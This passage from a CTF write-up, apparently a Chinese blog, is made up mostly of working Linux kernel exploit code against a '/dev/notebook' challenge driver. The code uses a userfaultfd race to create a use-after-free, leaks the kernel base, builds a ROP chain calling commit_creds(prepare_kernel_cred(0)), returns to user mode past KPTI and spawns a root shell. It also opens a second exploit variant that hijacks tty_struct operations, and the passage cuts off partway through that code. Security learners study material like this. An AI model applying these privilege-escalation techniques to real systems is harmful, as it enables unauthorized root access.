class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_start_func = <span class="number">0xFFFFFFFF8128C230</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_1a8 = <span class="number">0xffffffff816473a4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsp_ret = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kpti_trampoline_addr = <span class="number">0xFFFFFFFF81A0093F</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_pop_rdx_pop_ret = <span class="number">0xffffffff810d7324</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rbp_ret = <span class="number">0xffffffff81478d44</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_rdi_rax_pop_ret = <span class="number">0xffffffff8110d81a</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_pop_ret = <span class="number">0xffffffff810637d4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> iretq = <span class="number">0xFFFFFFFF81A009E7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> cc_addr = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pkc_addr = <span class="number">0xFFFFFFFF810A9EF0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    signal(SIGSEGV,getshell);</span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// sleep(1);   //给1s缓冲时间，让size值写上</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);              <span class="comment">// in kernel it will kmalloc(0x20)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)ret_buf;</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            index = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. leak kernel base: read heap1</span></span><br><span class="line">    kernel_base = leak_addr - (single_start_func - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. hijack control flow: write heap1, then trigger &#x27;seq_operations-&gt;start&#x27;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> control_rip = add_rsp_1a8 - bzImage_base + kernel_base;</span><br><span class="line">    write_note((<span class="keyword">char</span>*)&amp;control_rip,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 7. stack pivot: use the gift func ^_^</span></span><br><span class="line">    save_status();</span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">1</span>,<span class="number">0x200</span>,name);</span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    heap_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);                 <span class="comment">// heap addr</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> gadget_buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gadget_buf[a++] = pop_rdi_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;                                     </span><br><span class="line">    gadget_buf[a++] = pkc_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = pop_rsi_pop_rdx_pop_ret - bzImage_base + kernel_base;     <span class="comment">// mov rdi, rax</span></span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = pop_rbp_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = mov_rdi_rax_pop_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = cc_addr - bzImage_base + kernel_base;;</span><br><span class="line">    gadget_buf[a++] = swapgs_pop_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;           </span><br><span class="line">    gadget_buf[a++] = iretq - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = (<span class="keyword">uint64_t</span>)getshell;</span><br><span class="line">    gadget_buf[a++] = user_cs;</span><br><span class="line">    gadget_buf[a++] = user_rflags;</span><br><span class="line">    gadget_buf[a++] = user_sp;</span><br><span class="line">    gadget_buf[a++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write_note(gadget_buf,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. trigger</span></span><br><span class="line">    temp_fd = fd[index];</span><br><span class="line">    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x13131313;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x12121212;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x10101010;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, pop_rsp_ret;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, heap_addr;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x99999999;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp4"   >
          <a href="#exp4" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp4" class="headerlink" title="exp4"></a>exp4</h3>
      <blockquote>
<p>利用work_for_cpu_fn()函数，劫持tty_struct-&gt;ops-&gt;ioctl，分两次执行commit_cred(prepare_kernel_creds(0))，最后在用户态执行system(“/bin/sh”)获得root shell</p>
</blockquote>
<p>注意点：</p>
<ol>
<li><p>只能用ioctl，不能用write</p>
</li>
<li><p>写tty_struct和file_operations要先将内容读出，改掉目标位置后，再将内容全部写回。</p>
</li>
</ol>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span 